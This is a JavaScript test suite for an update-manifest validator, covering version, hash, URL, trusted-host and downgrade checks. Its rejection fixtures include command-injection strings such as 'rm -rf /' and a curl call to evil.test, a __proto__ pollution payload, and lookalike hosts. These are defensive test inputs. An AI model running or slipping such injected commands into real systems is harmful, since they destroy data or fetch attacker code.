import test from 'node:test';
import assert from 'node:assert/strict';

import {validateUpdateManifest, compareVersions, planUpdate} from '../src/update-manifest.mjs';

const OPTS = {trustedHosts: ['updates.example.com']};
const MAX_SIZE = 300 * 1024 * 1024;
const FIELDS = ['arch', 'downloadUrl', 'platform', 'publishedAt', 'sha256', 'size', 'version'];

const base = (overrides = {}) => ({
  version: '1.2.3',
  platform: 'win32',
  arch: 'x64',
  downloadUrl: 'https://updates.example.com/app-1.2.3.exe',
  sha256: 'a'.repeat(64),
  size: 1024,
  publishedAt: '2026-11-11T10:00:00Z',
  ...overrides,
});

function expectManifestError(fn, pattern, name) {
  assert.throws(fn, error => {
    assert.ok(error instanceof TypeError, 'expected a TypeError');
    assert.equal(error.code, 'ERR_INVALID_UPDATE_MANIFEST');
    if (name) assert.equal(error.name, name);
    if (pattern) assert.match(error.message, pattern);
    return true;
  });
}

// Uses arguments.length so an explicit `undefined` options value is still tested.
function rejects(input, pattern, options) {
  const opts = arguments.length >= 3 ? options : OPTS;
  expectManifestError(() => validateUpdateManifest(input, opts), pattern, 'ManifestValidationError');
}

const accepts = (field, values, options = OPTS) => {
  for (const value of values) assert.equal(validateUpdateManifest(base({[field]: value}), options)[field], value, String(value));
};
const rejectsAll = (field, values, pattern) => {
  for (const value of values) rejects(base({[field]: value}), pattern);
};

/** Define a throwing accessor and assert validation never invokes it. */
function rejectsAccessor(target, key, run, pattern) {
  let calls = 0;
  Object.defineProperty(target, key, {enumerable: true, configurable: true, get() { calls += 1; throw new Error('getter must never execute'); }});
  run(pattern);
  assert.equal(calls, 0);
}

test('accepts a normal manifest and returns a frozen copy of only the standard fields', () => {
  const input = base();
  const result = validateUpdateManifest(input, OPTS);
  assert.deepEqual(result, base());
  assert.deepEqual(Object.keys(result).sort(), FIELDS);
  assert.deepEqual(input, base(), 'caller input is not mutated');
  assert.ok(Object.isFrozen(result));
  assert.throws(() => { result.size = 10; }, TypeError);
  assert.throws(() => { delete result.sha256; }, TypeError);
  assert.deepEqual(validateUpdateManifest(Object.assign(Object.create(null), base()), OPTS), base());
  assert.deepEqual(validateUpdateManifest(JSON.parse(JSON.stringify(base())), OPTS), base());
});

test('accepts strict SemVer, URL, size, sha256 and timestamp boundaries', () => {
  accepts('version', ['0.0.0', '1.2.3', '10.20.30', '1.0.0-0', '1.0.0-0A', '1.0.0-alpha', '1.0.0-alpha.0', '1.0.0-alpha.1',
    '1.0.0-alpha.beta', '1.0.0-rc.1', '1.0.0-x.7.z.92', '1.0.0--', '0.0.1-alpha']);
  // Explicit :443, query strings and uppercase hosts are kept verbatim.
  accepts('downloadUrl', ['https://updates.example.com:443/app.exe?channel=stable', 'https://UPDATES.EXAMPLE.COM/app.exe']);
  accepts('downloadUrl', ['https://cdn.example.com/app.exe'], {trustedHosts: ['updates.example.com', 'cdn.example.com']});
  accepts('size', [1, MAX_SIZE]);
  accepts('publishedAt', ['2026-11-11T10:00:00Z', '2026-11-11T10:00:00.1Z', '2026-11-11T10:00:00.123Z', '2024-02-29T23:59:59Z', '2026-01-01T00:00:00Z']);
  assert.equal(validateUpdateManifest(base({sha256: 'AB'.repeat(32)}), OPTS).sha256, 'ab'.repeat(32));
});

test('rejects non-object inputs, class instances and missing or unknown fields', () => {
  for (const input of [null, undefined, 'manifest', 42, true, [], new Date(), () => {}]) rejects(input);
  class FakeManifest { constructor() { Object.assign(this, base()); } }
  rejects(new FakeManifest(), /plain object/);
  for (const field of FIELDS) {
    const input = base();
    delete input[field];
    rejects(input, new RegExp(field));
  }
  for (const field of ['signature', 'url', 'Version', 'notes']) rejects({...base(), [field]: 'x'}, new RegExp(`unknown field "${field}"`));
});

test('rejects prototype keys, hidden and symbol properties without invoking accessors', () => {
  const polluted = JSON.parse(JSON.stringify(base()).replace('{', '{"__proto__":{"polluted":true},'));
  rejects(polluted, /unknown field "__proto__"/);
  assert.equal({}.polluted, undefined);

  const hidden = base();
  Object.defineProperty(hidden, 'hidden', {value: true, enumerable: false});
  rejects(hidden, /property "hidden" must be enumerable/);
  const hiddenKnown = base();
  Object.defineProperty(hiddenKnown, 'size', {value: 1024, enumerable: false, writable: true, configurable: true});
  rejects(hiddenKnown, /property "size" must be enumerable/);

  rejects({...base(), [Symbol('hidden')]: true}, /symbol keys/);
  for (const key of ['version', 'signature']) {
    const input = base();
    rejectsAccessor(input, key, pattern => rejects(input, pattern), new RegExp(`accessor property "${key}"`));
  }
  const symbolTrap = base();
  rejectsAccessor(symbolTrap, Symbol('trap'), pattern => rejects(symbolTrap, pattern), /symbol keys/);
});

test('rejects unsupported platform and architecture values', () => {
  rejectsAll('platform', ['darwin', 'linux', 'freebsd', 'Win32', 'WIN32', '', null, 1], /platform/);
  rejectsAll('arch', ['arm64', 'ia32', 'x86', 'X64', 'amd64', '', null, 64], /arch/);
});

test('rejects malformed, non-canonical, injected, non-string and overlong versions', () => {
  rejectsAll('version', [
    '', '1', '1.2', '1.2.3.4', 'v1.2.3', 'V1.2.3', '01.2.3', '1.02.3', '1.2.03', '1.2.3-', '1.2.3-01', '1.2.3-alpha..1',
    '1.2.3-alpha.', '1.2.3-+', ' 1.2.3', '1.2.3 ', '1.2.3\n', '1.2.3\t', '1.2.3-beta+exp.sha.5114f85', '1.2.3+meta', '+1.2.3',
    '1.2.3; rm -rf /', '1.2.3 && calc.exe', '1.2.3 | whoami', '$(reboot)', '`shutdown /s`', '1.2.3;$(curl http://evil.test/x)',
    '1.2.3\n2.0.0', '1.2.3\r\n2.0.0', '1.2.3\u0000', '../../1.2.3', '1.2.3/../../x',
    123, null, undefined, {}, ['1.2.3'], new String('1.2.3'),
  ], /version/);
  rejects(base({version: `1.2.3-${'a'.repeat(260)}`}), /at most 256/);
});

test('rejects sha256, size and publishedAt outside their exact formats', () => {
  rejectsAll('sha256', ['', 'a'.repeat(63), 'a'.repeat(65), 'g'.repeat(64), 'z'.repeat(64), `sha256:${'a'.repeat(64)}`,
    ` ${'a'.repeat(64)}`, `${'a'.repeat(64)} `, `${'a'.repeat(32)}-${'a'.repeat(31)}`, `${'a'.repeat(64)}\n`, null, 42], /sha256/);
  rejectsAll('size', [0, -1, MAX_SIZE + 1, 1.5, NaN, Infinity, -Infinity, Number.MAX_SAFE_INTEGER, Number.MAX_SAFE_INTEGER + 1,
    '1024', 1024n, null, true, new Number(1024)], /size/);
  rejectsAll('publishedAt', ['', '2026-11-11', '2026-11-11 10:00:00Z', '2026-11-11T10:00:00', '2026-11-11T10:00:00z',
    '2026-11-11T10:00:00+08:00', '2026-11-11T10:00:00.1234Z', '2026-11-11T24:00:00Z', '2026-11-11T10:60:00Z', '2026-11-11T10:00:60Z',
    '2026-13-01T00:00:00Z', '2026-00-01T00:00:00Z', '2026-02-30T00:00:00Z', '2026-02-29T00:00:00Z', '0999-01-01T00:00:00Z',
    '0000-01-01T00:00:00Z', '2026-11-11T10:00:00Z ', ' 2026-11-11T10:00:00Z', '2026-11-11T10:00:00.000Z\n', null, 1762855200000], /publishedAt/);
});

test('downloadUrl must be HTTPS on port 443 without userinfo, fragments, IPs or localhost', () => {
  const url = path => `https://${path}`;
  rejectsAll('downloadUrl', ['', 'http://updates.example.com/app.exe', 'ftp://updates.example.com/app.exe', 'file:///C:/app.exe',
    '//updates.example.com/app.exe', '/app.exe', 'updates.example.com/app.exe', 'https:///app.exe', url('updates.example.com/app.exe#fragment'),
    url('updates.example.com/app.exe#'), url('updates.example.com/app exe'), url('updates.example.com/app.exe\n'),
    url('updates.example.com\\app.exe'), null, 42, {}], /downloadUrl/);
  rejectsAll('downloadUrl', ['user@updates.example.com', 'user:password@updates.example.com', '@updates.example.com',
    'evil.com@updates.example.com', 'updates.example.com@evil.com'].map(host => url(`${host}/app.exe`)), /userinfo/);
  rejectsAll('downloadUrl', [8443, 80, 0, 4430].map(port => url(`updates.example.com:${port}/app.exe`)), /port 443/);
  rejectsAll('downloadUrl', ['localhost', 'LOCALHOST', 'foo.localhost', '127.0.0.1', '0.0.0.0', '1.2.3.4', '[::1]', '[2001:db8::1]',
    '2130706433', 'updates.example.com.'].map(host => url(`${host}/app.exe`)), /localhost|IP|hostname/);
});

test('download host must be an exact explicit trustedHosts member', () => {
  rejectsAll('downloadUrl', ['evil.com/updates.example.com', 'updates.example.com.evil.com', 'evil-updates.example.com', 'sub.updates.example.com']
    .map(host => `https://${host}/app.exe`), /not in trustedHosts/);
  accepts('downloadUrl', ['https://sub.updates.example.com/app.exe'], {trustedHosts: ['updates.example.com', 'sub.updates.example.com']});
});

test('rejects missing, malformed or unsafe trustedHosts options', () => {
  expectManifestError(() => validateUpdateManifest(base()), /options/);
  const badOptions = [
    undefined, null, 'updates.example.com', {}, {trustedHosts: []}, {trustedHosts: 'updates.example.com'},
    ...[42, '', '*.example.com', 'https://updates.example.com', 'updates.example.com:443', 'updates.example.com/path', 'Updates.example.com',
      ' updates.example.com', 'updates.example.com.', '127.0.0.1', '[::1]', 'localhost', 'foo.localhost'].map(host => ({trustedHosts: [host]})),
    {...OPTS, allowHttp: true},
  ];
  for (const options of badOptions) rejects(base(), /trustedHosts|options/, options);

  const options = {};
  rejectsAccessor(options, 'trustedHosts', pattern => rejects(base(), pattern, options), /accessor property "trustedHosts"/);
  const hosts = ['updates.example.com'];
  rejectsAccessor(hosts, 1, pattern => rejects(base(), pattern, {trustedHosts: hosts}), /accessor property "1"/);
});

test('trustedHosts must be an ordinary dense array of enumerable elements only', () => {
  const host = 'updates.example.com';
  const sparse = [host];
  sparse.length = 2;
  const decorated = Object.assign([host], {note: 'extra'});
  const hidden = Object.defineProperty([host], 0, {value: host, enumerable: false, writable: true, configurable: true});
  const symbolKeyed = Object.assign([host], {[Symbol('extra')]: 'x'});
  class Hosts extends Array {}
  for (const [trustedHosts, pattern] of [
    [sparse, /dense array without holes/], [decorated, /unexpected property "note"/], [hidden, /element 0 must be enumerable/],
    [symbolKeyed, /symbol properties/], [Hosts.from([host]), /ordinary array/],
  ]) rejects(base(), pattern, {trustedHosts});
});

test('compareVersions implements SemVer precedence exactly', () => {
  for (const version of ['1.2.3', '0.0.0-alpha', '1.0.0-alpha.1']) assert.equal(compareVersions(version, version), 0);
  // Each row is strictly ascending; both directions are asserted for every pair.
  const chains = [
    ['1.0.0', '2.0.0'], ['1.9.0', '1.10.0'], ['1.0.9', '1.0.10'], ['1.99.99', '2.0.0'],
    ['1.0.0-alpha', '1.0.0-alpha.1', '1.0.0-alpha.beta', '1.0.0-beta', '1.0.0-beta.2', '1.0.0-beta.11', '1.0.0-rc.1', '1.0.0'],
    ['1.0.0-2', '1.0.0-11'], ['1.0.0-1', '1.0.0-alpha'], ['1.0.0-alpha.1', '1.0.0-alpha.beta'],
    ['99999999999999999998.0.0', '99999999999999999999.0.0'], ['1.0.0-99999999999999999998', '1.0.0-99999999999999999999', '1.0.0'],
  ];
  for (const ordered of chains) {
    for (let i = 0; i < ordered.length; i += 1) {
      for (let j = i + 1; j < ordered.length; j += 1) {
        assert.equal(compareVersions(ordered[i], ordered[j]), -1, `${ordered[i]} < ${ordered[j]}`);
        assert.equal(compareVersions(ordered[j], ordered[i]), 1, `${ordered[j]} > ${ordered[i]}`);
      }
    }
  }
  expectManifestError(() => compareVersions('1.0', '1.0.0'), /strict SemVer/);
  expectManifestError(() => compareVersions('1.0.0', '1.0.0+build'), /build metadata/);
  expectManifestError(() => compareVersions(null, '1.0.0'), /must be a string/);
  expectManifestError(() => compareVersions('1.0.0', 2), /must be a string/);
});

test('planUpdate classifies upgrades, same versions and blocked downgrades with frozen results', () => {
  for (const [current, target, status] of [
    ['1.2.2', '1.2.3', 'upgrade'], ['1.2.3', '1.2.3', 'same'], ['1.2.4', '1.2.3', 'downgrade-blocked'],
    ['2.0.0-rc.1', '2.0.0', 'upgrade'], ['2.0.0', '2.0.0-rc.1', 'downgrade-blocked'],
    ['2.0.0-rc.1', '2.0.0-rc.2', 'upgrade'], ['2.0.0-beta.11', '2.0.0-beta.2', 'downgrade-blocked'],
  ]) {
    const plan = planUpdate(current, base({version: target}), OPTS);
    assert.equal(plan.status, status, `${current} -> ${target}`);
    assert.deepEqual(plan.manifest, base({version: target}));
  }
  const plan = planUpdate('1.0.0', base(), OPTS);
  assert.ok(Object.isFrozen(plan) && Object.isFrozen(plan.manifest));
  assert.throws(() => { plan.status = 'upgrade'; }, TypeError);
});

test('planUpdate validates the current version, manifest and trusted hosts', () => {
  for (const current of ['1.0', 'v1.0.0', '1.0.0+build', '1.0.0; rm -rf /', null, 1]) {
    expectManifestError(() => planUpdate(current, base(), OPTS), /current/);
  }
  expectManifestError(() => planUpdate('1.0.0', base({arch: 'arm64'}), OPTS), /arch/);
  expectManifestError(() => planUpdate('1.0.0', base({downloadUrl: 'https://evil.com/x'}), OPTS), /trustedHosts/);
  expectManifestError(() => planUpdate('1.0.0', base(), undefined), /options/);
});
